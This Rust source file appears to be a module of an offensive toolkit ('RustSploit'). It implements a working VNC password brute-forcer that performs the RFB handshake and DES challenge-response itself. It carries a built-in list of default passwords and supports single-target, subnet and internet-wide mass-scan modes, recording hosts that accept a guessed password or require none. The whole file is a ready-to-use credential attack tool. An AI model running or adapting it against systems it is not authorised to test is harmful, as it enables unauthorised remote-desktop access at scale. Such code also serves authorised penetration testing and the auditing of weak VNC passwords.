//! VNC Brute Force Module
//!
//! Raw TCP implementation of VNC (RFB) DES challenge-response authentication.
//! Supports RFB protocol versions 3.3, 3.7, and 3.8.
//!
//! Protocol flow:
//! 1. Read server version: "RFB 003.00x\n"
//! 2. Send client version: "RFB 003.008\n"
//! 3. Read security types, select VNC Authentication (type 2)
//! 4. Read 16-byte challenge
//! 5. Encrypt challenge with DES using password (bit-reversed, padded to 8 bytes)
//! 6. Send 16-byte encrypted response
//! 7. Read 4-byte security result: 0x00000000 = success

use anyhow::{anyhow, Result};
use colored::*;
use des::cipher::{BlockEncrypt, KeyInit, generic_array::GenericArray};
use des::Des;
use std::io::Write;
use std::net::IpAddr;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

use crate::modules::creds::utils::{
    generate_combos_mode, ComboMode,
    is_mass_scan_target, is_subnet_target, run_bruteforce, run_mass_scan,
    run_subnet_bruteforce, BruteforceConfig, LoginResult, MassScanConfig, SubnetScanConfig,
};
use crate::utils::{
    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_output_file,
    cfg_prompt_port, cfg_prompt_yes_no, get_filename_in_current_dir, load_lines, normalize_target,
};

// ============================================================================
// Constants
// ============================================================================

const DEFAULT_VNC_PORT: u16 = 5900;
const CONNECT_TIMEOUT_MS: u64 = 5000;
const READ_TIMEOUT_MS: u64 = 5000;

/// VNC is password-only (no username). These are common default passwords.
const DEFAULT_PASSWORDS: &[&str] = &[
    "",
    "password",
    "1234",
    "admin",
    "vnc",
    "pass",
    "12345",
    "123456",
    "vncpass",
    "root",
    "test",
    "default",
];

// RFB protocol constants
const RFB_VERSION_38: &[u8] = b"RFB 003.008\n";
const RFB_VERSION_37: &[u8] = b"RFB 003.007\n";
const VNC_AUTH_TYPE: u8 = 2;
const VNC_AUTH_NONE: u8 = 1;
const CHALLENGE_LEN: usize = 16;

// ============================================================================
// Module Info
// ============================================================================

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "VNC Brute Force".to_string(),
        description: "Brute-force VNC authentication using DES challenge-response over raw TCP. \
            Implements the RFB protocol handshake with proper bit-reversed DES key derivation. \
            VNC uses password-only auth (max 8 chars). Supports default password testing, \
            wordlist mode, subnet scanning, and mass scan."
            .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![
            "https://www.rfc-editor.org/rfc/rfc6143".to_string(),
        ],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

// ============================================================================
// Main Entry Point
// ============================================================================

pub async fn run(target: &str) -> Result<()> {
    crate::mprintln!("{}", "=== VNC Brute Force Module ===".bold());
    crate::mprintln!("[*] Target: {}", target);

    // --- Mass Scan Mode ---
    if is_mass_scan_target(target) {
        crate::mprintln!(
            "{}",
            format!("[*] Target: {} -- Mass Scan Mode", target).yellow()
        );
        return run_mass_scan(
            target,
            MassScanConfig {
                protocol_name: "VNC",
                default_port: DEFAULT_VNC_PORT,
                state_file: "vnc_brute_hose_state.log",
                default_output: "vnc_mass_results.txt",
                default_concurrency: 200,
            },
            move |ip, port| async move {
                if !crate::utils::tcp_port_open(ip, port, Duration::from_secs(5)).await {
                    return None;
                }
                let addr = format!("{}:{}", ip, port);
                let passwords = ["", "password", "1234", "admin", "vnc", "pass"];
                for pass in passwords {
                    match try_vnc_auth(&addr, pass).await {
                        VncResult::Success => {
                            let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                            let display_pass = if pass.is_empty() { "(empty)" } else { pass };
                            return Some(format!(
                                "[{}] {}:{}:(vnc):{}\n",
                                ts, ip, port, display_pass
                            ));
                        }
                        VncResult::NoAuth => {
                            let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                            return Some(format!(
                                "[{}] {}:{}:(vnc):(no-auth-required)\n",
                                ts, ip, port
                            ));
                        }
                        VncResult::ConnectionError(_) => return None,
                        VncResult::AuthFailed | VncResult::ProtocolError(_) => {}
                    }
                }
                None
            },
        )
        .await;
    }

    // --- Subnet Scan Mode ---
    if is_subnet_target(target) {
        crate::mprintln!(
            "{}",
            format!("[*] Target: {} (Subnet Scan)", target).cyan()
        );

        let port: u16 = cfg_prompt_port("port", "VNC Port", DEFAULT_VNC_PORT).await?;
        let passwords_file =
            cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let passes = load_lines(&passwords_file)?;
        if passes.is_empty() {
            return Err(anyhow!("Password list empty"));
        }

        let concurrency: usize = {
            let input = cfg_prompt_default("concurrency", "Max concurrent hosts", "10").await?;
            input.parse::<usize>().unwrap_or(10).max(1).min(256)
        };
        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
        let output_file = cfg_prompt_output_file(
            "output_file",
            "Output result file",
            "vnc_subnet_results.txt",
        )
        .await?;

        // VNC is password-only: use a single dummy username and the password list
        let users = vec!["vnc".to_string()];

        return run_subnet_bruteforce(
            target,
            port,
            users,
            passes,
            &SubnetScanConfig {
                concurrency,
                verbose,
                output_file,
                service_name: "vnc",
                jitter_ms: 0,
                source_module: "creds/generic/vnc_bruteforce",
                skip_tcp_check: false,
            },
            move |ip: IpAddr, port: u16, _user: String, pass: String| async move {
                let addr = format!("{}:{}", ip, port);
                match try_vnc_auth(&addr, &pass).await {
                    VncResult::Success | VncResult::NoAuth => LoginResult::Success,
                    VncResult::AuthFailed => LoginResult::AuthFailed,
                    VncResult::ConnectionError(e) => LoginResult::Error {
                        message: e,
                        retryable: true,
                    },
                    VncResult::ProtocolError(e) => LoginResult::Error {
                        message: e,
                        retryable: false,
                    },
                }
            },
        )
        .await;
    }

    // --- Single Target Mode ---
    let port: u16 = cfg_prompt_port("port", "VNC Port", DEFAULT_VNC_PORT).await?;

    let use_defaults =
        cfg_prompt_yes_no("use_defaults", "Try default passwords first?", true).await?;

    let passwords_file =
        if cfg_prompt_yes_no("use_password_wordlist", "Use password wordlist?", true).await? {
            Some(cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?)
        } else {
            None
        };

    if !use_defaults && passwords_file.is_none() {
        return Err(anyhow!(
            "At least a password wordlist or default passwords must be enabled"
        ));
    }

    let concurrency: usize = {
        let input = cfg_prompt_default("concurrency", "Max concurrent tasks", "5").await?;
        input.parse::<usize>().unwrap_or(5).max(1).min(50)
    };

    let stop_on_success =
        cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;
    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
    let save_path = if save_results {
        Some(
            cfg_prompt_output_file("output_file", "Output file", "vnc_brute_results.txt").await?,
        )
    } else {
        None
    };
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;

    let retry_on_error =
        cfg_prompt_yes_no("retry_on_error", "Retry on connection errors?", true).await?;
    let max_retries: usize = if retry_on_error {
        let input = cfg_prompt_default("max_retries", "Max retries per attempt", "2").await?;
        input.parse::<usize>().unwrap_or(2).max(1).min(10)
    } else {
        0
    };

    // Load passwords
    let mut passwords = Vec::new();
    if let Some(ref file) = passwords_file {
        passwords = load_lines(file)?;
        if passwords.is_empty() {
            crate::mprintln!("{}", "[!] Password wordlist is empty.".yellow());
        } else {
            crate::mprintln!(
                "{}",
                format!("[*] Loaded {} passwords", passwords.len()).green()
            );
        }
    }

    // Add default passwords if requested
    if use_defaults {
        for pass in DEFAULT_PASSWORDS {
            if !passwords.contains(&pass.to_string()) {
                passwords.push(pass.to_string());
            }
        }
        crate::mprintln!(
            "{}",
            format!("[*] Added {} default passwords", DEFAULT_PASSWORDS.len()).green()
        );
    }

    if passwords.is_empty() {
        return Err(anyhow!("No passwords available"));
    }

    // VNC is password-only: use a single dummy username for the combos framework
    let usernames = vec!["vnc".to_string()];
    let combos = generate_combos_mode(&usernames, &passwords, ComboMode::Linear);

    crate::mprintln!(
        "\n{}",
        format!(
            "[*] Starting VNC brute-force on {}:{} ({} passwords, {} threads)",
            target,
            port,
            passwords.len(),
            concurrency
        )
        .cyan()
    );
    crate::mprintln!(
        "{}",
        "[*] Note: VNC uses password-only auth (max 8 chars)".blue()
    );

    let try_login = move |t: String, p: u16, _user: String, pass: String| async move {
        let addr = normalize_target(&format!("{}:{}", t, p))
            .unwrap_or_else(|_| format!("{}:{}", t, p));
        match try_vnc_auth(&addr, &pass).await {
            VncResult::Success | VncResult::NoAuth => LoginResult::Success,
            VncResult::AuthFailed => LoginResult::AuthFailed,
            VncResult::ConnectionError(e) => LoginResult::Error {
                message: e,
                retryable: true,
            },
            VncResult::ProtocolError(e) => LoginResult::Error {
                message: e,
                retryable: false,
            },
        }
    };

    let result = run_bruteforce(
        &BruteforceConfig {
            target: target.to_string(),
            port,
            concurrency,
            stop_on_success,
            verbose,
            delay_ms: 100, // VNC servers often rate-limit; small delay helps
            max_retries,
            service_name: "vnc",
            jitter_ms: 0,
            source_module: "creds/generic/vnc_bruteforce",
        },
        combos,
        try_login,
    )
    .await?;

    // Print results with VNC-specific formatting (password-only, no username)
    if result.found.is_empty() {
        crate::mprintln!("{}", "[-] No valid passwords found.".yellow());
    } else {
        crate::mprintln!(
            "{}",
            format!("[+] Found {} valid password(s):", result.found.len())
                .green()
                .bold()
        );
        for (host, _user, pass) in &result.found {
            let display_pass = if pass.is_empty() {
                "(empty)".to_string()
            } else {
                pass.clone()
            };
            crate::mprintln!("  {} {}  password: {}", ">>".green(), host, display_pass);
        }
    }

    if let Some(ref path) = save_path {
        result.save_to_file(path)?;
    }

    // Unknown / errored attempts
    if !result.errors.is_empty() {
        crate::mprintln!(
            "{}",
            format!(
                "[?] Collected {} unknown/errored VNC responses.",
                result.errors.len()
            )
            .yellow()
            .bold()
        );
        if cfg_prompt_yes_no(
            "save_unknown_responses",
            "Save unknown responses to file?",
            true,
        )
        .await?
        {
            let default_name = "vnc_unknown_responses.txt";
            let fname = cfg_prompt_output_file(
                "unknown_responses_file",
                "What should the unknown results be saved as?",
                default_name,
            )
            .await?;
            let filename = get_filename_in_current_dir(&fname);
            use std::os::unix::fs::OpenOptionsExt;
            let mut opts = std::fs::OpenOptions::new();
            opts.write(true).create(true).truncate(true);
            opts.mode(0o600);
            match opts.open(&filename) {
                Ok(mut file) => {
                    writeln!(
                        file,
                        "# VNC Bruteforce Unknown/Errored Responses (host,pass,error)"
                    )?;
                    for (host, _user, pass, msg) in &result.errors {
                        writeln!(file, "{} -> {} - {}", host, pass, msg)?;
                    }
                    file.flush()?;
                    crate::mprintln!(
                        "{}",
                        format!("[+] Unknown responses saved to '{}'", filename.display()).green()
                    );
                }
                Err(e) => {
                    crate::mprintln!(
                        "{}",
                        format!(
                            "[!] Could not create unknown response file '{}': {}",
                            filename.display(),
                            e
                        )
                        .red()
                    );
                }
            }
        }
    }

    Ok(())
}

// ============================================================================
// VNC (RFB) Protocol Implementation
// ============================================================================

#[derive(Debug)]
enum VncResult {
    /// Authentication succeeded (correct password).
    Success,
    /// Server requires no authentication.
    NoAuth,
    /// Authentication was rejected (wrong password).
    AuthFailed,
    /// TCP/IO error.
    ConnectionError(String),
    /// Protocol-level error (unsupported version, etc.).
    ProtocolError(String),
}

/// Reverse the bits in a byte (VNC DES key derivation requirement).
///
/// VNC reverses each byte of the password before using it as a DES key.
fn reverse_bits(b: u8) -> u8 {
    let mut result = 0u8;
    let mut input = b;
    for _ in 0..8 {
        result = (result << 1) | (input & 1);
        input >>= 1;
    }
    result
}

/// Derive the VNC DES key from a password.
///
/// Password is truncated to 8 bytes (or zero-padded if shorter),
/// then each byte is bit-reversed.
fn vnc_des_key(password: &str) -> [u8; 8] {
    let mut key = [0u8; 8];
    let pass_bytes = password.as_bytes();
    let copy_len = pass_bytes.len().min(8);
    key[..copy_len].copy_from_slice(&pass_bytes[..copy_len]);

    // Bit-reverse each byte
    for byte in &mut key {
        *byte = reverse_bits(*byte);
    }

    key
}

/// Encrypt a 16-byte VNC challenge using DES ECB with the derived key.
///
/// The challenge is encrypted as two 8-byte blocks independently (ECB mode).
fn vnc_des_encrypt(key: &[u8; 8], challenge: &[u8; 16]) -> [u8; 16] {
    let des_key = GenericArray::from_slice(key);
    let cipher = Des::new(des_key);

    let mut result = [0u8; 16];

    // Encrypt first 8-byte block
    let mut block1 = GenericArray::clone_from_slice(&challenge[0..8]);
    cipher.encrypt_block(&mut block1);
    result[0..8].copy_from_slice(&block1);

    // Encrypt second 8-byte block
    let mut block2 = GenericArray::clone_from_slice(&challenge[8..16]);
    cipher.encrypt_block(&mut block2);
    result[8..16].copy_from_slice(&block2);

    result
}

/// Parse the RFB server version string and return (major, minor).
fn parse_rfb_version(version_str: &[u8]) -> Result<(u16, u16)> {
    // Expected format: "RFB XXX.YYY\n" (12 bytes)
    if version_str.len() < 12 {
        return Err(anyhow!("Version string too short"));
    }
    if &version_str[0..4] != b"RFB " {
        return Err(anyhow!("Not an RFB server"));
    }

    let major_str = String::from_utf8_lossy(&version_str[4..7]);
    let minor_str = String::from_utf8_lossy(&version_str[8..11]);

    let major: u16 = major_str
        .trim()
        .parse()
        .map_err(|_| anyhow!("Invalid major version: {}", major_str))?;
    let minor: u16 = minor_str
        .trim()
        .parse()
        .map_err(|_| anyhow!("Invalid minor version: {}", minor_str))?;

    Ok((major, minor))
}

/// Attempt VNC authentication against a target address.
async fn try_vnc_auth(addr: &str, password: &str) -> VncResult {
    // TCP connect with timeout
    let mut stream = match crate::utils::network::tcp_connect(addr, Duration::from_millis(CONNECT_TIMEOUT_MS)).await {
        Ok(s) => s,
        Err(e) => return VncResult::ConnectionError(format!("Connect failed: {}", e)),
    };

    // Step 1: Read server version string (12 bytes)
    let mut server_version = [0u8; 12];
    match tokio::time::timeout(
        Duration::from_millis(READ_TIMEOUT_MS),
        stream.read_exact(&mut server_version),
    )
    .await
    {
        Ok(Ok(_)) => {}
        Ok(Err(e)) => {
            return VncResult::ConnectionError(format!("Failed to read server version: {}", e))
        }
        Err(_) => return VncResult::ConnectionError("Timeout reading server version".to_string()),
    }

    let (_major, minor) = match parse_rfb_version(&server_version) {
        Ok(v) => v,
        Err(e) => return VncResult::ProtocolError(format!("Version parse error: {}", e)),
    };

    // Step 2: Send client version (use 3.8 for best compatibility, fall back to 3.7)
    let client_version = if minor >= 8 { RFB_VERSION_38 } else { RFB_VERSION_37 };
    if let Err(e) = stream.write_all(client_version).await {
        return VncResult::ConnectionError(format!("Failed to send client version: {}", e));
    }
    if let Err(e) = stream.flush().await {
        return VncResult::ConnectionError(format!("Flush error: {}", e));
    }

    // Step 3: Read security types
    if minor >= 7 {
        // RFB 3.7+: read number of security types, then the type bytes
        let mut num_types_buf = [0u8; 1];
        match tokio::time::timeout(
            Duration::from_millis(READ_TIMEOUT_MS),
            stream.read_exact(&mut num_types_buf),
        )
        .await
        {
            Ok(Ok(_)) => {}
            Ok(Err(e)) => {
                return VncResult::ConnectionError(format!(
                    "Failed to read security type count: {}",
                    e
                ))
            }
            Err(_) => {
                return VncResult::ConnectionError(
                    "Timeout reading security type count".to_string(),
                )
            }
        }

        let num_types = num_types_buf[0] as usize;

        if num_types == 0 {
            // Server is refusing the connection -- read reason string
            let mut len_buf = [0u8; 4];
            if let Ok(Ok(_)) = tokio::time::timeout(
                Duration::from_millis(READ_TIMEOUT_MS),
                stream.read_exact(&mut len_buf),
            )
            .await
            {
                let reason_len = u32::from_be_bytes(len_buf) as usize;
                if reason_len > 0 && reason_len < 4096 {
                    let mut reason = vec![0u8; reason_len];
                    if let Ok(Ok(_)) = tokio::time::timeout(
                        Duration::from_millis(READ_TIMEOUT_MS),
                        stream.read_exact(&mut reason),
                    )
                    .await
                    {
                        let reason_str = String::from_utf8_lossy(&reason);
                        if reason_str.to_lowercase().contains("too many") {
                            return VncResult::ConnectionError(format!(
                                "Rate limited: {}",
                                reason_str
                            ));
                        }
                        return VncResult::ProtocolError(format!(
                            "Connection refused: {}",
                            reason_str
                        ));
                    }
                }
            }
            return VncResult::ProtocolError("Connection refused (0 security types)".to_string());
        }

        let mut types = vec![0u8; num_types];
        match tokio::time::timeout(
            Duration::from_millis(READ_TIMEOUT_MS),
            stream.read_exact(&mut types),
        )
        .await
        {
            Ok(Ok(_)) => {}
            Ok(Err(e)) => {
                return VncResult::ConnectionError(format!(
                    "Failed to read security types: {}",
                    e
                ))
            }
            Err(_) => {
                return VncResult::ConnectionError("Timeout reading security types".to_string())
            }
        }

        // Check for None auth (type 1) -- no password needed
        if types.contains(&VNC_AUTH_NONE) && !types.contains(&VNC_AUTH_TYPE) {
            // Select None auth
            if let Err(e) = stream.write_all(&[VNC_AUTH_NONE]).await {
                return VncResult::ConnectionError(format!("Failed to select None auth: {}", e));
            }
            return VncResult::NoAuth;
        }

        if !types.contains(&VNC_AUTH_TYPE) {
            return VncResult::ProtocolError(format!(
                "VNC Authentication (type 2) not supported. Available: {:?}",
                types
            ));
        }

        // Select VNC Authentication (type 2)
        if let Err(e) = stream.write_all(&[VNC_AUTH_TYPE]).await {
            return VncResult::ConnectionError(format!(
                "Failed to select VNC auth type: {}",
                e
            ));
        }
        if let Err(e) = stream.flush().await {
            return VncResult::ConnectionError(format!("Flush error: {}", e));
        }
    } else {
        // RFB 3.3: server picks the security type (4 bytes, big-endian)
        let mut type_buf = [0u8; 4];
        match tokio::time::timeout(
            Duration::from_millis(READ_TIMEOUT_MS),
            stream.read_exact(&mut type_buf),
        )
        .await
        {
            Ok(Ok(_)) => {}
            Ok(Err(e)) => {
                return VncResult::ConnectionError(format!("Failed to read security type: {}", e))
            }
            Err(_) => {
                return VncResult::ConnectionError("Timeout reading security type".to_string())
            }
        }

        let sec_type = u32::from_be_bytes(type_buf);
        match sec_type {
            0 => {
                return VncResult::ProtocolError(
                    "Server refused connection (security type 0)".to_string(),
                )
            }
            1 => return VncResult::NoAuth,
            2 => {} // VNC Authentication -- proceed
            _ => {
                return VncResult::ProtocolError(format!(
                    "Unsupported security type: {}",
                    sec_type
                ))
            }
        }
    }

    // Step 4: Read 16-byte challenge
    let mut challenge = [0u8; CHALLENGE_LEN];
    match tokio::time::timeout(
        Duration::from_millis(READ_TIMEOUT_MS),
        stream.read_exact(&mut challenge),
    )
    .await
    {
        Ok(Ok(_)) => {}
        Ok(Err(e)) => {
            return VncResult::ConnectionError(format!("Failed to read challenge: {}", e))
        }
        Err(_) => return VncResult::ConnectionError("Timeout reading challenge".to_string()),
    }

    // Step 5: Encrypt challenge with DES using bit-reversed password key
    let key = vnc_des_key(password);
    let response = vnc_des_encrypt(&key, &challenge);

    // Step 6: Send encrypted response
    if let Err(e) = stream.write_all(&response).await {
        return VncResult::ConnectionError(format!("Failed to send auth response: {}", e));
    }
    if let Err(e) = stream.flush().await {
        return VncResult::ConnectionError(format!("Flush error: {}", e));
    }

    // Step 7: Read security result (4 bytes)
    let mut result_buf = [0u8; 4];
    match tokio::time::timeout(
        Duration::from_millis(READ_TIMEOUT_MS),
        stream.read_exact(&mut result_buf),
    )
    .await
    {
        Ok(Ok(_)) => {}
        Ok(Err(e)) => {
            return VncResult::ConnectionError(format!("Failed to read auth result: {}", e))
        }
        Err(_) => return VncResult::ConnectionError("Timeout reading auth result".to_string()),
    }

    let security_result = u32::from_be_bytes(result_buf);

    match security_result {
        0 => VncResult::Success,
        1 => {
            // Failed -- in RFB 3.8, a reason string follows
            if minor >= 8 {
                let mut len_buf = [0u8; 4];
                if let Ok(Ok(_)) = tokio::time::timeout(
                    Duration::from_millis(READ_TIMEOUT_MS),
                    stream.read_exact(&mut len_buf),
                )
                .await
                {
                    let reason_len = u32::from_be_bytes(len_buf) as usize;
                    if reason_len > 0 && reason_len < 4096 {
                        let mut reason = vec![0u8; reason_len];
                        match tokio::time::timeout(
                            Duration::from_millis(READ_TIMEOUT_MS),
                            stream.read_exact(&mut reason),
                        )
                        .await {
                            Err(_) => crate::meprintln!("[!] VNC reason read timed out"),
                            Ok(Err(e)) => crate::meprintln!("[!] VNC reason read error: {}", e),
                            Ok(Ok(_)) => {}
                        }
                    }
                }
            }
            VncResult::AuthFailed
        }
        2 => VncResult::ProtocolError("Too many authentication failures".to_string()),
        other => VncResult::ProtocolError(format!("Unknown security result: {}", other)),
    }
}
